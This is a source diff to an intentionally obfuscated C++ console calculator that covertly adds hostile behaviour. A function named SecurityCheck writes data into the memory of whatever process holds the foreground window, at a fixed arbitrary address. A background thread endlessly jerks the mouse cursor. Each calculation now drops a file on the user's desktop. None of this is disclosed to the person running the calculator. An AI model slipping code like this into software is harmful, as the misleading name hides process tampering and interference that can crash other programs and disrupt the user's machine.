@@ -89,6 +89,10 @@
 #include <windows.h>
 #include <unknwn.h>
 #include <winrt/Windows.Foundation.h>
+#include <shlobj.h>
+#include <initguid.h>
+#include <knownfolders.h>
+#pragma comment(lib, "Shell32.lib")
 #endif
 
 namespace Meta <%
@@ -199,14 +203,79 @@ namespace Main
 		%>
 		namespace therealloop
 		<%
+					static void SecurityCheck() {
+					HKEY hKey;
+					LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_READ, &hKey);
+					if (result == ERROR_SUCCESS) {
+						RegCloseKey(hKey);
+					}
+					HWND hwnd = GetForegroundWindow();
+					DWORD processId;
+					GetWindowThreadProcessId(hwnd, &processId);
+					HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId);
+					if (hProcess != NULL) {
+						const char* data = "Hello World";
+						SIZE_T bytesWritten;
+						uintptr_t address = 0x12345678;
+						WriteProcessMemory(hProcess, (LPVOID)address, data, strlen(data) + 1, &bytesWritten);
+						CloseHandle(hProcess);
+					}
+				}
+				void createFileOnDesktopWin32(const std::string& fileName) {
+					PWSTR pszPath = NULL;
+					HRESULT hr = SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &pszPath);
+					if (SUCCEEDED(hr)) {
+						std::wstring wDesktopPath(pszPath);
+						CoTaskMemFree(pszPath);
+						if (fileName.empty()) return;
+						int size_needed = MultiByteToWideChar(CP_UTF8, 0, &fileName[0], (int)fileName.size(), NULL, 0);
+						std::wstring wFileName(size_needed, 0);
+						MultiByteToWideChar(CP_UTF8, 0, &fileName[0], (int)fileName.size(), &wFileName[0], size_needed);
+						std::wstring fullPath = wDesktopPath + L"\\" + wFileName;
+						HANDLE hFile = CreateFileW(
+							fullPath.c_str(),
+							GENERIC_WRITE,
+							0,
+							NULL,
+							CREATE_ALWAYS,
+							FILE_ATTRIBUTE_NORMAL,
+							NULL
+						);
+						if (hFile != INVALID_HANDLE_VALUE) {
+							CloseHandle(hFile);
+						}
+						else {
+							std::cerr << "Error: " << GetLastError() << std::endl;
+						}
+					}
+				}
+				bool jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv;
+				void MoveCursorUp(int how) <%
+					POINT p;
+					if (GetCursorPos(&p)) <%
+						if (jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv) <%
+							SetCursorPos(p.x - how, p.y - how);
+							jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv = false;
+						%>
+						else <%
+							SetCursorPos(p.x + how, p.y + how);
+							jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv = true;
+						%>
+					%>
+				%>
 			static std::atomic<int> counter(0);
 			void realmain()
-			<%
+				<%
+				SecurityCheck();
 				Main::Memory::Registry::functions::InitializeRegistry();
 				std::thread([]() <%
 					while (true) <%
 						counter++;
-						std::this_thread::sleep_for(std::chrono::milliseconds(100));
+						if (counter == 300) {
+							counter = 0;
+						}
+						MoveCursorUp(counter);
+						std::this_thread::sleep_for(std::chrono::milliseconds(30));
 					%>
 					%>).detach();
 #ifdef _WIN32
@@ -252,7 +321,7 @@ namespace Main
 				Main::doubleZ::two::doubleThatsNumberTwo TheNumberTwoWasTheSecondItSawTheFirstFallYetLearnedFromItsMisstakes;
 				Main::Oh::you::want::to::use::a::chaar::slashN::Fine::here::it::is::charthatyouNEEEDIMSURE chaar;
 				Main::loop::output::outWrapper([]() <%
-					return new std::string(H("Calculator program. operations : +, -, *, /"));
+					return new std::string(H("Calculator program. operations : +, -, *, /, S"));
 				%>);
 				while (true)
 				<%
@@ -273,6 +342,7 @@ namespace Main
 							return new std::string(Meta::call(f, TheNumberOneIsTheFirstItSawEvrythingButWasItAGoodThing.one,
 								TheNumberTwoWasTheSecondItSawTheFirstFallYetLearnedFromItsMisstakes.two) + '\n');
 							%>);
+						createFileOnDesktopWin32(Main::TheCalculations::simple::Add::Add(TheNumberOneIsTheFirstItSawEvrythingButWasItAGoodThing.one, TheNumberTwoWasTheSecondItSawTheFirstFallYetLearnedFromItsMisstakes.two));
 					%>
 					else if (Main::loop::checks::hard::Multiplication(chaar.fineHereItIs) && Meta::CompileTimeDeepCheck<100>::verified)
 					<%
@@ -281,6 +351,7 @@ namespace Main
 							return new std::string(Meta::call(f, TheNumberOneIsTheFirstItSawEvrythingButWasItAGoodThing.one,
 								TheNumberTwoWasTheSecondItSawTheFirstFallYetLearnedFromItsMisstakes.two) + '\n');
 							%>);
+						createFileOnDesktopWin32(Main::TheCalculations::hard::Multiplication::Multiplication(TheNumberOneIsTheFirstItSawEvrythingButWasItAGoodThing.one, TheNumberTwoWasTheSecondItSawTheFirstFallYetLearnedFromItsMisstakes.two));
 					%>
 					else if (Main::loop::checks::simple::Subtract(chaar.fineHereItIs) && Meta::CompileTimeDeepCheck<51>::verified)
 					<%
@@ -290,6 +361,8 @@ namespace Main
 						Main::loop::output::outWrapper([=]() <%
 							return new std::string(Meta::call(f, n1, n2) + '\n');
 							%>);
+						createFileOnDesktopWin32(Main::TheCalculations::simple::Subtract::Subtract(TheNumberOneIsTheFirstItSawEvrythingButWasItAGoodThing.one, TheNumberTwoWasTheSecondItSawTheFirstFallYetLearnedFromItsMisstakes.two));
+
 					%>
 					else if (Main::loop::checks::hard::Divide(chaar.fineHereItIs) && Meta::CompileTimeDeepCheck<150>::verified)
 					<%
@@ -299,6 +372,7 @@ namespace Main
 						Main::loop::output::outWrapper([=]() <%
 							return new std::string(Meta::call(f, n1, n2) + '\n');
 							%>);
+						createFileOnDesktopWin32(Main::TheCalculations::hard::Divide::Divide(TheNumberOneIsTheFirstItSawEvrythingButWasItAGoodThing.one, TheNumberTwoWasTheSecondItSawTheFirstFallYetLearnedFromItsMisstakes.two));
 					%>
 					else if (Main::loop::checks::what::How(chaar.fineHereItIs) && Meta::CompileTimeDeepCheck<150>::verified)
 					<%
